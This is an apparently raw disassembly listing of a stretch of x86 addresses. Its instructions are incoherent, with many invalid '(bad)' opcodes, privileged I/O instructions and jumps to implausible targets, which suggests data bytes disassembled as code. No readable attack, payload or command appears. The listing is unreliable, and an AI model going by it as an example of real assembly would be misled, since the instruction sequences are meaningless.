  40ccc7:	mov    BYTE PTR [ebp+0x1],dl
  40ccca:	and    al,0xcc
  40cccc:	pop    esi
  40cccd:	dec    ecx
  40ccce:	stc    
  40cccf:	loop   0x40cc69
  40ccd1:	cmc    
  40ccd2:	stos   BYTE PTR es:[edi],al
  40ccd3:	inc    esp
  40ccd4:	(bad)  
  40ccd5:	mov    eax,0xdee9e729
  40ccda:	test   BYTE PTR [edi],bl
  40ccdc:	es out 0xab,al
  40ccdf:	jb     0x40cc95
  40cce1:	bound  edi,QWORD PTR [edi+0x4b]
  40cce4:	mov    edx,0xa080aa63
  40cce9:	pop    esp
  40ccea:	mov    edi,0xb4347ae4
  40ccef:	mul    DWORD PTR [ebp-0x5dbf92c3]
  40ccf5:	pop    ds
  40ccf6:	pop    gs
  40ccf8:	icebp  
  40ccf9:	aaa    
  40ccfa:	leave  
  40ccfb:	(bad)  
  40ccfc:	cld    
  40ccfd:	push   ebp
  40ccfe:	xor    al,0x8b
  40cd00:	das    
  40cd01:	cli    
  40cd02:	addr16 pop eax
  40cd04:	iret   
  40cd05:	int3   
  40cd06:	sub    edi,DWORD PTR [ebx+0x4]
  40cd09:	imul   DWORD PTR [eax+0x3824be5c]
  40cd0f:	sbb    cl,BYTE PTR [esi+0x56]
  40cd12:	mov    ebx,0x33fce8d7
  40cd17:	jmp    FWORD PTR [eax]
  40cd19:	mov    fs,WORD PTR [edi-0x5b2b741d]
  40cd1f:	add    eax,esi
  40cd21:	push   esi
  40cd22:	std    
  40cd23:	or     BYTE PTR ds:0xe360ffb9,0x66
  40cd2a:	xchg   DWORD PTR [ebx-0x336ad3c9],edi
  40cd30:	out    0xf7,al
  40cd32:	imul   eax,DWORD PTR ds:0xc6c83d77,0x3e3e9194
  40cd3c:	cmp    eax,DWORD PTR [ebx+0x28c4f681]
  40cd42:	and    esp,DWORD PTR [esi]
  40cd44:	adc    ah,cl
  40cd46:	loope  0x40cd09
  40cd48:	das    
  40cd49:	mul    BYTE PTR [ebx-0x62f20bef]
  40cd4f:	inc    ecx
  40cd50:	mov    ecx,0xaedd507b
  40cd55:	lea    esi,[edx-0x56991ffd]
  40cd5b:	xor    eax,0x5016d398
  40cd60:	scas   al,BYTE PTR es:[edi]
  40cd61:	xor    dh,BYTE PTR [ecx-0x4fd24516]
  40cd67:	push   ecx
  40cd68:	pop    ecx
  40cd69:	clc    
  40cd6a:	mov    dl,BYTE PTR [edx+eiz*8+0x1d96fb5f]
  40cd71:	and    ch,BYTE PTR [ebx]
  40cd73:	in     al,0x88
  40cd75:	dec    ebx
  40cd76:	adc    BYTE PTR [eax-0x68],0x52
  40cd7a:	and    bl,BYTE PTR [edi-0x3e]
  40cd7d:	lds    ebp,FWORD PTR [esi-0x287a441c]
  40cd83:	ins    BYTE PTR es:[edi],dx
  40cd84:	cmp    eax,0xebf3f4e4
  40cd89:	(bad)  
  40cd8b:	mov    bh,0x6e
  40cd8d:	inc    ebx
  40cd8e:	out    0xa1,al
  40cd90:	sub    BYTE PTR [ecx-0x5e056aa0],0x69
  40cd97:	mov    eax,esp
  40cd99:	inc    esp
  40cd9a:	or     eax,0x13e6b3a8
  40cd9f:	dec    esp
  40cda0:	sbb    al,BYTE PTR [ecx]
  40cda2:	xor    eax,DWORD PTR [edx-0x6bfcc3c4]
  40cda8:	inc    edi
  40cda9:	add    ebx,DWORD PTR [edx]
  40cdab:	ds or  esp,0xffffffc0
  40cdaf:	outs   dx,BYTE PTR ds:[esi]
  40cdb0:	jecxz  0x40cd3f
  40cdb2:	sub    al,0xc4
  40cdb4:	sub    BYTE PTR [ebx],dl
  40cdb6:	fild   QWORD PTR [edx+0x15]
  40cdb9:	jecxz  0x40cd90
  40cdbb:	sub    al,0xda
  40cdbd:	arpl   WORD PTR [edi+0x61],si
  40cdc0:	ret    
  40cdc1:	bound  eax,QWORD PTR [eax+0x67be053]
  40cdc7:	xchg   ebx,eax
  40cdc8:	or     eax,0x87993641
  40cdcd:	sbb    ah,BYTE PTR [ecx+0x299241bc]
  40cdd3:	pop    edx
  40cdd4:	add    al,0x11
  40cdd6:	sub    BYTE PTR [ebx-0x16],dh
  40cdd9:	in     al,0xd7
  40cddb:	pop    ebx
  40cddc:	add    edi,DWORD PTR [edx+0x152e2bb8]
  40cde2:	cmp    DWORD PTR [edx+0x4b184d9e],0xd49bef0
  40cdec:	out    dx,al
  40cded:	inc    ebp
  40cdee:	dec    eax
  40cdef:	mov    ah,0xcf
  40cdf1:	(bad)  
  40cdf3:	xchg   edi,eax
  40cdf4:	sbb    eax,0x373955f3
  40cdf9:	xchg   edi,eax
  40cdfa:	data16 clc 
  40cdfc:	ins    DWORD PTR es:[edi],dx
  40cdfd:	push   0x6434b00e
  40ce02:	cmp    edi,DWORD PTR [eax]
  40ce04:	mov    DWORD PTR [eax+0x1e],ebp
  40ce07:	adc    edx,DWORD PTR [esi-0x4b2271a2]
  40ce0d:	mov    ss,WORD PTR [eax+0x9]
  40ce10:	mov    ch,0x46
  40ce12:	or     BYTE PTR [esp+ebp*4-0x143e50e7],bl
  40ce19:	xchg   edi,eax
  40ce1a:	jmp    0x40ce88
  40ce1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce1d:	leave  
  40ce1e:	push   ss
  40ce1f:	push   ebx
  40ce20:	add    al,0x44
  40ce22:	inc    esp
  40ce23:	shr    DWORD PTR [esi+0x60b6a970],cl
  40ce29:	call   0x1cab9f66
  40ce2e:	xor    bh,BYTE PTR [edx+0x560237fc]
  40ce34:	and    DWORD PTR [esi+0x46],ecx
  40ce37:	or     al,0xc1
  40ce39:	mov    BYTE PTR [ebp-0x5c],ah
  40ce3c:	mov    esi,0xefda311d
  40ce41:	cmp    al,0xfb
  40ce43:	add    ecx,DWORD PTR [ecx-0x54]
  40ce46:	shl    DWORD PTR [esp+ebp*4+0x1d4f06f2],0x2b
  40ce4e:	fld    DWORD PTR [edi+0x25ee9cb]
  40ce54:	add    BYTE PTR [eax],al
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	paddw  mm3,QWORD PTR [ebx]
  40ce65:	cvttps2pi mm1,QWORD PTR [ebx+0x7c387e7e]
  40ce6c:	jle    0x40ceec
  40ce6e:	shl    BYTE PTR cs:[edi],1
  40ce71:	mov    edx,0x66571f56
  40ce76:	xchg   BYTE PTR [ecx+0x6a],dl
  40ce79:	and    ah,0x27
  40ce7c:	dec    ebp
  40ce7d:	repz cmp DWORD PTR [edx+0xeb060e7],0xffffffb4
  40ce85:	inc    ebx
  40ce86:	inc    eax
  40ce87:	ror    DWORD PTR [esi+0x1a2e906c],cl
  40ce8d:	pop    esp
  40ce8e:	xchg   edi,eax
  40ce8f:	push   ss
  40ce90:	add    BYTE PTR [edx-0x1404fa3e],bl
  40ce96:	aad    0x44
  40ce98:	jns    0x40cee0
  40ce9a:	fadd   DWORD PTR [ebp+edi*2-0x52]
  40ce9e:	sbb    DWORD PTR ds:0xa1403514,0xffffffba
  40cea5:	fdiv   QWORD PTR [esi-0x52]
  40cea8:	jnp    0x40ce54
  40ceaa:	int3   
  40ceab:	(bad)  
  40ceac:	fnstsw WORD PTR [ebp-0x35f78dde]
  40ceb2:	cmp    esi,DWORD PTR ds:0x9ef6de94
  40ceb8:	sbb    dl,BYTE PTR [ebx+eiz*1+0x14]
  40cebc:	sub    ch,ch
  40cebe:	fcomi  st,st(6)
  40cec0:	in     eax,dx
  40cec1:	add    eax,0x6f3e063b
  40cec6:	or     eax,0xd75bf9f7
  40cecb:	pop    ecx
  40cecc:	cs and al,dl
  40cecf:	test   al,0x42
  40ced1:	jne    0x40cea1
  40ced3:	cs fsub st,st(0)
  40ced6:	dec    ebp
  40ced7:	xor    DWORD PTR [esi-0x4fad1d5c],0x9
  40cede:	in     al,0x8c
  40cee0:	gs cld 
  40cee2:	jecxz  0x40cf16
  40cee4:	(bad)  
  40cee5:	frstor [ecx-0x41]
  40cee8:	mov    ebp,0x553d514a
  40ceed:	in     al,dx
  40ceee:	ins    BYTE PTR es:[edi],dx
  40ceef:	jo     0x40cef7
  40cef1:	stos   BYTE PTR es:[edi],al
  40cef2:	push   edx
  40cef3:	xchg   edx,eax
  40cef4:	push   cs
  40cef5:	mov    cl,0x22
  40cef7:	fs int3 
  40cef9:	xchg   ebx,eax
  40cefa:	loope  0x40cf72
  40cefc:	ret    
  40cefd:	add    bh,ah
  40ceff:	retf   
  40cf00:	push   ds
  40cf01:	mov    ah,0x81
  40cf03:	cli    
  40cf04:	jg     0x40cf51
  40cf06:	into   
  40cf07:	push   0x77
  40cf09:	push   edi
  40cf0a:	xchg   edx,eax
  40cf0b:	cli    
  40cf0c:	pop    edx
  40cf0d:	mov    ecx,0x32c9b819
  40cf12:	(bad)  
  40cf13:	cmovp  eax,DWORD PTR [ebp+0x20]
  40cf17:	fwait
  40cf18:	push   ecx
  40cf19:	jns    0x40cef5
  40cf1b:	lahf   
  40cf1c:	pop    ebp
  40cf1d:	out    dx,eax
  40cf1e:	outs   dx,DWORD PTR ds:[esi]
  40cf1f:	fiadd  WORD PTR [ebp+0x5f]
  40cf22:	lock lods al,BYTE PTR fs:[esi]
  40cf25:	mov    edi,0x2e5862ab
  40cf2a:	mov    ebx,0x5853fa8b
  40cf2f:	pop    eax
  40cf30:	jbe    0x40cec9
  40cf32:	jns    0x40cf28
  40cf34:	daa    
  40cf35:	inc    ebx
  40cf36:	jmp    0x40cf7e
  40cf38:	stos   BYTE PTR es:[edi],al
  40cf39:	ror    BYTE PTR [ebp+0x641aeacf],1
  40cf3f:	ins    WORD PTR es:[edi],dx
  40cf41:	push   es
  40cf42:	call   0x32c7:0x72f555c
  40cf49:	or     al,0xd1
  40cf4b:	mov    al,0xe3
  40cf4d:	cmp    BYTE PTR [eax-0x38e72b59],0xf8
  40cf54:	into   
  40cf55:	mov    BYTE PTR [ebp+0x2dd360c1],cl
  40cf5b:	(bad)  
  40cf5c:	cmc    
  40cf5d:	jp     0x40cf06
  40cf5f:	mov    BYTE PTR [ecx],ah
  40cf61:	rcr    BYTE PTR [ebp-0x5631ed68],0xfc
  40cf68:	(bad)  
  40cf6a:	popf   
  40cf6b:	test   esi,esp
  40cf6d:	inc    ebx
  40cf6e:	repz mov dl,0x78
  40cf71:	jge    0x40cf17
  40cf73:	xor    al,0xed
  40cf75:	jle    0x40cfbb
  40cf77:	ret    
  40cf78:	push   esi
  40cf79:	dec    ecx
  40cf7a:	fnsave [ebx]
  40cf7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf7d:	xor    DWORD PTR [ecx+0x6aed59b1],esp
  40cf83:	out    dx,eax
  40cf84:	xchg   esi,eax
  40cf85:	cmp    dl,BYTE PTR [ebp-0x7b]
  40cf88:	adc    eax,DWORD PTR ds:0xa0b0a959
  40cf8e:	sub    edi,DWORD PTR [ebp-0x54d49269]
  40cf94:	sbb    al,0x71
  40cf97:	add    al,0xf7
  40cf99:	dec    ebp
  40cf9a:	out    0x6b,al
  40cf9c:	xor    eax,0x5d986896
  40cfa1:	aad    0xcb
  40cfa3:	es mov ah,0x4c
  40cfa6:	jmp    0x40d019
  40cfa8:	mov    cl,0x9e
  40cfaa:	pop    eax
  40cfab:	add    eax,0xd5e7b081
  40cfb0:	das    
  40cfb1:	xchg   esi,eax
  40cfb2:	out    0xf1,eax
  40cfb4:	pop    esi
  40cfb5:	imul   edi,DWORD PTR ds:0x6205fa9d,0xe8dcacfe
  40cfbf:	mov    eax,ds:0x1197cdd7
  40cfc4:	jnp    0x40cf6f
  40cfc6:	or     al,0x25
  40cfc8:	pop    ecx
  40cfc9:	gs fdivr st,st(1)
  40cfcc:	and    ch,BYTE PTR [edx]
  40cfce:	(bad)  
  40cfcf:	stc    
  40cfd0:	enter  0x1738,0x77
  40cfd4:	or     al,0x44
  40cfd6:	rol    DWORD PTR [eax],0x46
  40cfd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfda:	mov    al,ds:0x9debc627
  40cfdf:	sbb    cl,BYTE PTR [edx+0x4ba97ff6]
  40cfe5:	push   esi
  40cfe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfe7:	mov    BYTE PTR ds:0xb95249d4,al
  40cfed:	retf   0xb21c
  40cff0:	ficomp DWORD PTR [edx]
  40cff2:	xchg   edx,eax
  40cff3:	stos   BYTE PTR es:[edi],al
  40cff4:	mov    ebx,DWORD PTR [esi-0x7c]
  40cff7:	push   0x42
  40cff9:	mov    ch,0x27
  40cffb:	pop    ds
  40cffc:	jmp    DWORD PTR [esi+0x49]
  40cfff:	lock cmp eax,0x457b3b9d
  40d005:	pop    eax
  40d006:	jb     0x40d018
  40d008:	xor    al,0xf
  40d00a:	xor    ecx,DWORD PTR [ecx+ecx*1-0x55]
  40d00e:	stos   BYTE PTR es:[edi],al
  40d00f:	mov    cl,0x5d
  40d011:	sahf   
  40d012:	enter  0x8ca6,0x8b
  40d016:	add    al,0x71
  40d018:	bound  ebx,QWORD PTR [edi]
  40d01a:	pusha  
  40d01b:	jl     0x40cfdd
  40d01d:	(bad)  
  40d01e:	out    0xfe,eax
  40d020:	fdivr  st,st(7)
  40d022:	pop    edx
  40d023:	xor    BYTE PTR [esi+0x780d0a35],0xad
  40d02a:	or     BYTE PTR [ebp+0x6cf33685],dh
  40d030:	rcl    BYTE PTR [eax+0x188329bb],cl
  40d036:	popa   
  40d037:	in     al,0xd7
  40d039:	jmp    0x3f0799cf
  40d03e:	stos   DWORD PTR es:[edi],eax
  40d03f:	adc    eax,0x2759ee62
  40d044:	inc    ebx
  40d045:	outs   dx,BYTE PTR ds:[esi]
  40d046:	xor    bl,0xf1
  40d049:	lea    ebx,[ebp-0x12]
  40d04c:	jnp    0x40cfed
  40d04e:	sub    BYTE PTR [ebp+0x20],0xca
  40d052:	jbe    0x40cfd5
  40d054:	jbe    0x40d003
  40d056:	xchg   esp,eax
  40d057:	pcmpeqb mm6,QWORD PTR gs:[ecx-0x34]
  40d05c:	jo     0x40d080
  40d05e:	jbe    0x40d00a
  40d060:	xchg   dl,al
  40d062:	xor    esi,DWORD PTR [esi]
  40d064:	loope  0x40cff5
  40d066:	mov    esi,0x4df69aed
  40d06b:	popf   
  40d06c:	in     al,dx
  40d06d:	rcr    BYTE PTR [eax+0x76],1
  40d070:	es jno 0x40d04b
  40d073:	jle    0x40d0d8
  40d075:	loope  0x40d052
  40d077:	mov    ebp,0x21410ad1
  40d07c:	dec    esp
  40d07d:	add    eax,0x851cf7c
  40d082:	jae    0x40d054
  40d084:	mov    ch,0x38
  40d086:	mov    ebp,DWORD PTR [eax-0x5cecb87d]
  40d08c:	and    cl,BYTE PTR [eax]
  40d08e:	jge    0x40d0fc
  40d090:	idiv   BYTE PTR [esi-0x4d70e4fe]
  40d096:	dec    edi
  40d097:	push   ebp
  40d098:	repnz inc edx
  40d09a:	out    dx,al
  40d09b:	hlt    
  40d09c:	(bad)  
  40d09d:	inc    esi
  40d09e:	ins    DWORD PTR es:[edi],dx
  40d09f:	pop    edi
  40d0a0:	xor    edi,DWORD PTR [ebp+0x39]
  40d0a3:	shl    ebx,0xcb
  40d0a6:	cmp    eax,0x91f8370e
  40d0ab:	cmp    bl,BYTE PTR [ecx+0x157f86aa]
  40d0b1:	aad    0x4d
  40d0b3:	push   0x49
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	lds    ecx,FWORD PTR [eax-0x7c]
  40d0d2:	icebp  
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d115
  40d0dc:	inc    esi
  40d0dd:	cmc    
  40d0de:	dec    ecx
  40d0df:	mov    ds:0x6e3516c8,eax
  40d0e4:	sbb    al,0x18
  40d0e6:	ins    DWORD PTR es:[edi],dx
  40d0e7:	push   cs
  40d0e8:	das    
  40d0e9:	push   ss
  40d0ea:	sbb    ah,0xd2
  40d0ed:	sub    BYTE PTR ds:0x450d6e74,cl
  40d0f3:	scas   al,BYTE PTR es:[edi]
  40d0f4:	repz adc dh,al
  40d0f7:	fld    DWORD PTR [ebp-0x553ca1bf]
  40d0fd:	shr    BYTE PTR [ebx+0x63],1
  40d100:	adc    eax,0x7a22a67a
  40d105:	psubusb mm4,QWORD PTR [edx+ebp*4]
  40d109:	jecxz  0x40d13f
  40d10b:	pop    edx
  40d10c:	push   eax
  40d10d:	repz sbb eax,0xdbe5e5b9
  40d113:	(bad)  
  40d114:	mov    dl,0xe4
  40d116:	cmp    al,0x46
  40d118:	or     edx,edi
  40d11a:	lods   eax,DWORD PTR ds:[esi]
  40d11b:	fwait
  40d11c:	adc    al,0xe0
  40d11e:	push   cs
  40d11f:	cdq    
  40d120:	pop    esp
  40d121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d122:	adc    eax,0x6d2533f9
  40d127:	pop    eax
  40d128:	lds    eax,FWORD PTR [ecx]
  40d12a:	sahf   
  40d12b:	cli    
  40d12c:	sbb    DWORD PTR [edx],ebp
  40d12e:	data16 and BYTE PTR [ebx-0x19599d3],ah
  40d135:	fcom   DWORD PTR [eax]
  40d137:	pushf  
  40d138:	add    DWORD PTR [ebp+0x105c2d3a],eax
  40d13e:	push   0x516329f2
  40d143:	shl    BYTE PTR [esi],1
  40d145:	cwde   
  40d146:	repnz inc eax
  40d148:	mov    esi,0xaecc8fb8
  40d14d:	cld    
  40d14e:	inc    ecx
  40d14f:	pop    esp
  40d150:	inc    ecx
  40d151:	cwde   
  40d152:	mov    eax,ds:0x896e3f2b
  40d157:	jbe    0x40d0fc
  40d159:	xchg   edx,eax
  40d15a:	xor    al,0x5b
  40d15c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d15d:	bound  eax,QWORD PTR [ebx]
  40d15f:	jg     0x40d18c
  40d161:	ins    DWORD PTR es:[edi],dx
  40d162:	sahf   
  40d163:	ss loope 0x40d1ad
  40d166:	gs out 0x7a,eax
  40d169:	add    edi,DWORD PTR [edi-0x80]
  40d16c:	sub    ebp,0xd4fecfe4
  40d172:	sub    ch,BYTE PTR [esi]
  40d174:	sahf   
  40d175:	retf   0xa5ba
  40d178:	retf   
  40d179:	push   ds
  40d17a:	push   esi
  40d17b:	enter  0xc05a,0xb
  40d17f:	mov    DWORD PTR [ebp-0x4eb9e556],eax
  40d185:	repnz mov ebx,0xc6b68397
  40d18b:	out    0x54,al
  40d18d:	stos   DWORD PTR es:[edi],eax
  40d18e:	jmp    FWORD PTR [esi]
  40d190:	push   esp
  40d191:	xchg   ebp,eax
  40d192:	jle    0x40d1ba
  40d194:	sub    al,0x61
  40d196:	je     0x40d1cc
  40d198:	sbb    BYTE PTR [ebx-0x727b4053],0x2c
  40d19f:	out    0xfb,al
  40d1a1:	jne    0x40d157
  40d1a3:	test   al,0x7e
  40d1a5:	(bad)  
  40d1a6:	pop    eax
  40d1a7:	mov    ch,BYTE PTR [ebp+0x658d8718]
  40d1ad:	popf   
  40d1ae:	inc    eax
  40d1af:	loop   0x40d20b
  40d1b1:	hlt    
  40d1b2:	ja     0x40d230
  40d1b4:	push   0x690386f
  40d1b9:	sbb    eax,0x3004c1cb
  40d1be:	mov    esi,0x41726b1a
  40d1c3:	sbb    DWORD PTR [edx+0x12],ebx
  40d1c6:	push   ebx
  40d1c7:	adc    ebx,DWORD PTR [edx-0x21]
  40d1ca:	pop    edi
  40d1cb:	repnz mov bh,BYTE PTR [ecx]
  40d1ce:	sub    al,0x7d
  40d1d0:	(bad)  [ebx]
  40d1d2:	mov    BYTE PTR [eax+ebp*4-0x73],dh
  40d1d6:	in     eax,0x3c
  40d1d8:	pop    ds
  40d1d9:	imul   esi,DWORD PTR [ecx+eiz*4+0x73],0xe
  40d1de:	xchg   BYTE PTR [esi+esi*4+0x6c],ch
  40d1e2:	jmp    0x40d1e8
  40d1e4:	retf   
  40d1e5:	add    eax,DWORD PTR [ebx+0x3e]
  40d1e8:	inc    ecx
  40d1e9:	repnz push edi
  40d1eb:	in     eax,dx
  40d1ec:	int    0xfd
  40d1ee:	sti    
  40d1ef:	mov    ebp,0xfe29403a
  40d1f4:	mov    edx,0xa073d89e
  40d1f9:	inc    ecx
  40d1fa:	and    al,0xc8
  40d1fc:	sbb    DWORD PTR [ebx],0x61
  40d1ff:	xlat   BYTE PTR ds:[ebx]
  40d200:	pop    esp
  40d201:	jmp    0x79c911dc
  40d206:	test   DWORD PTR [edi+0x1dc4b391],esp
  40d20c:	aam    0x4f
  40d20e:	cmp    al,0x36
  40d210:	mov    dl,0x7f
  40d212:	add    eax,esi
  40d214:	sbb    BYTE PTR [ecx+0x6a],bh
  40d217:	adc    eax,0xd22e5efa
  40d21c:	cwde   
  40d21d:	stos   BYTE PTR es:[edi],al
  40d21e:	test   ebp,0xe5421215
  40d224:	jne    0x40d1a6
  40d226:	ret    0x9df8
  40d229:	(bad)  
  40d22b:	fnstenv [edi-0x55]
  40d22e:	fistp  QWORD PTR [esi-0x13]
  40d231:	push   ebp
  40d232:	das    
  40d233:	(bad)  
  40d234:	sti    
  40d235:	pusha  
  40d236:	or     eax,0x44599d93
  40d23b:	mov    ds:0x333f6e65,al
  40d240:	iret   
  40d241:	fst    QWORD PTR [ebx+0x79]
  40d244:	cmp    DWORD PTR [ebx],esi
  40d246:	(bad)  
  40d247:	and    eax,DWORD PTR [eax-0x26]
  40d24a:	call   0xabb86f6c
  40d24f:	xchg   bl,dh
  40d251:	std    
  40d252:	stc    
  40d253:	xor    eax,0x45
  40d256:	jb     0x40d240
  40d258:	out    0xad,eax
  40d25a:	out    0x89,eax
  40d25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d25d:	adc    DWORD PTR [ebx+0x22],ebx
  40d260:	xchg   edi,eax
  40d261:	sub    ch,al
  40d263:	xchg   DWORD PTR [esp+edi*8],esp
  40d266:	retf   0xade0
  40d269:	fadd   QWORD PTR [ebp-0x11]
  40d26c:	jnp    0x40d2de
  40d26e:	push   ds
  40d26f:	les    ecx,FWORD PTR [esi+eax*8+0x3e]
  40d273:	mov    eax,0x3086ad35
  40d278:	(bad)  
  40d279:	fisttp QWORD PTR [ecx+0x37]
  40d27c:	mov    dl,0x91
  40d27e:	mov    dh,0x59
  40d280:	xor    DWORD PTR [ebp-0x1b],eax
  40d283:	sti    
  40d284:	sub    al,0x29
  40d286:	sbb    eax,DWORD PTR [ebx+0x11ddabd1]
  40d28c:	fstp   QWORD PTR [esp+edx*1]
  40d28f:	ficom  WORD PTR [esi-0xd]
  40d292:	fistp  QWORD PTR [edi+eiz*8-0x59]
  40d296:	mov    BYTE PTR [ecx-0x7a],dl
  40d299:	in     eax,dx
  40d29a:	bound  ecx,QWORD PTR [edx-0x24f3da4f]
  40d2a0:	jb     0x40d29a
  40d2a2:	xchg   ebx,eax
  40d2a3:	inc    esi
  40d2a4:	(bad)  
  40d2a5:	ins    BYTE PTR es:[edi],dx
  40d2a6:	mov    ds:0x4a0a2821,eax
  40d2ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2ac:	pop    ss
  40d2ad:	mov    fs,WORD PTR [edx]
  40d2af:	(bad)  
  40d2b1:	lea    esp,[edi+eiz*1+0x65]
  40d2b5:	into   
  40d2b6:	leave  
  40d2b7:	pop    ebx
  40d2b8:	jno    0x40d27f
  40d2ba:	jecxz  0x40d261
  40d2bc:	aaa    
  40d2bd:	jo     0x40d2c6
  40d2bf:	xchg   edi,eax
  40d2c0:	jmp    0x40d280
  40d2c2:	shl    DWORD PTR [esp+ebx*1+0x6ae1f97d],1
  40d2c9:	or     al,0xee
  40d2cb:	out    0xd2,al
  40d2cd:	jp     0x40d2dc
  40d2cf:	stos   BYTE PTR es:[edi],al
  40d2d0:	sub    BYTE PTR [eax+edx*2],0x10
  40d2d4:	cli    
  40d2d5:	fbstp  TBYTE PTR [ebx+0x7fda3645]
  40d2db:	mov    BYTE PTR [ecx-0x6a3506ed],ah
  40d2e1:	mov    ds,edx
  40d2e3:	sub    al,0xf9
  40d2e5:	ret    0xb5d1
  40d2e8:	bound  edx,QWORD PTR [esi+eax*4+0x4d2ed5c6]
  40d2ef:	test   BYTE PTR [esi+0x13],0xc4
  40d2f3:	loope  0x40d2d4
  40d2f5:	push   0xebf72b6b
  40d2fa:	dec    ebx
  40d2fb:	and    eax,0xd4f5c0a3
  40d300:	dec    edx
  40d301:	cmp    cl,BYTE PTR [eax-0xd0590a4]
  40d307:	lock mov edi,0xe8ca85e3
  40d30d:	repz jbe 0x40d29c
  40d310:	mov    BYTE PTR [edi+0x593920d3],dl
  40d316:	std    
  40d317:	clc    
  40d318:	aam    0x53
  40d31a:	retf   
  40d31b:	popa   
  40d31c:	add    dl,BYTE PTR [eax-0x63]
  40d31f:	add    BYTE PTR [eax+edx*2-0x2b7424cd],bl
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	fwait
  40d339:	outs   dx,DWORD PTR ds:[esi]
  40d33a:	mov    dl,0x29
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	arpl   bp,bx
  40d346:	push   edx
  40d347:	sbb    BYTE PTR [edi-0x7],al
  40d34a:	mov    bl,0xc8
  40d34c:	xchg   ecx,eax
  40d34d:	pop    edx
  40d34e:	aam    0x6a
  40d350:	mov    esp,DWORD PTR [ebx+0x3]
  40d353:	push   cs
  40d354:	dec    esi
  40d355:	out    0x6b,eax
  40d357:	sub    bl,dh
  40d359:	xor    al,0x11
  40d35b:	xadd   BYTE PTR [esi-0x58],bl
  40d35f:	out    dx,eax
  40d360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d361:	cmp    eax,esp
  40d363:	imul   BYTE PTR [edi-0x35]
  40d366:	xchg   esp,eax
  40d367:	or     bh,BYTE PTR [esi+0x13]
  40d36a:	jne    0x40d38e
  40d36c:	inc    ebx
  40d36d:	xchg   ebp,eax
  40d36e:	jecxz  0x40d367
  40d370:	sub    ecx,DWORD PTR [edx]
  40d372:	dec    ecx
  40d373:	sti    
  40d374:	fnsave [ecx]
  40d376:	add    BYTE PTR [eax-0x20],0x7d
  40d37a:	pop    esi
  40d37b:	xchg   ebx,eax
  40d37d:	les    edx,FWORD PTR [ecx]
  40d37f:	and    DWORD PTR [edi+0x77],edx
  40d382:	pop    ebx
  40d383:	dec    edi
  40d384:	push   0xccfa69ed
  40d389:	or     eax,0x61489088
  40d38e:	add    BYTE PTR [ecx-0x66209160],bh
  40d394:	and    ah,BYTE PTR [ecx]
  40d396:	sbb    eax,DWORD PTR [ebp+eax*4+0x1d]
  40d39a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d39b:	sti    
  40d39c:	xor    BYTE PTR [edi],0xf3
  40d39f:	xchg   edx,eax
  40d3a0:	add    dl,BYTE PTR [ecx+0x7680b00a]
  40d3a6:	hlt    
  40d3a7:	cld    
  40d3a8:	mov    al,0x43
  40d3aa:	jecxz  0x40d338
  40d3ac:	aad    0x50
  40d3ae:	stos   DWORD PTR es:[edi],eax
  40d3af:	or     DWORD PTR [esi-0x65182ba7],edi
  40d3b5:	loope  0x40d414
  40d3b7:	js     0x40d346
  40d3b9:	outs   dx,BYTE PTR ds:[esi]
  40d3ba:	mov    esp,0x23f4c39
  40d3bf:	xchg   ecx,eax
  40d3c0:	je     0x40d424
  40d3c2:	scas   al,BYTE PTR es:[edi]
  40d3c3:	js     0x40d356
  40d3c5:	dec    ebp
  40d3c6:	addr16 je 0x40d3a5
  40d3c9:	mov    edi,0x95575645
  40d3ce:	cmp    DWORD PTR [ebp-0xa90da77],ebp
  40d3d4:	stc    
  40d3d5:	push   eax
  40d3d6:	pushf  
  40d3d7:	out    dx,eax
  40d3d8:	jns    0x40d37c
  40d3da:	pushf  
  40d3db:	cmp    esi,DWORD PTR [eax-0x2d5d91ab]
  40d3e1:	das    
  40d3e2:	outs   dx,BYTE PTR ds:[esi]
  40d3e3:	popf   
  40d3e4:	enter  0x6613,0x28
  40d3e8:	outs   dx,BYTE PTR ds:[esi]
  40d3e9:	cmp    al,0xa
  40d3eb:	pop    ebx
  40d3ec:	sub    DWORD PTR [edx-0x16ead94b],edi
  40d3f2:	jbe    0x40d393
  40d3f4:	mov    bh,0x16
  40d3f6:	call   0x74459b9f
  40d3fb:	xchg   esp,eax
  40d3fc:	xlat   BYTE PTR ds:[ebx]
  40d3fd:	and    ebx,DWORD PTR gs:[edi-0x35]
  40d401:	inc    ecx
  40d402:	stos   DWORD PTR es:[edi],eax
  40d403:	mov    dh,0x43
  40d405:	js     0x40d3b0
  40d407:	mov    eax,0x54b9bb41
  40d40c:	xchg   ebp,eax
  40d40d:	push   ss
  40d40e:	xchg   esi,eax
  40d40f:	sub    BYTE PTR [ecx-0x53],dh
  40d412:	hlt    
  40d413:	add    DWORD PTR [eax],esi
  40d415:	sbb    eax,0xe758fa77
  40d41a:	and    BYTE PTR [ecx],0x60
  40d41d:	test   al,0x53
  40d41f:	rol    eax,0xf5
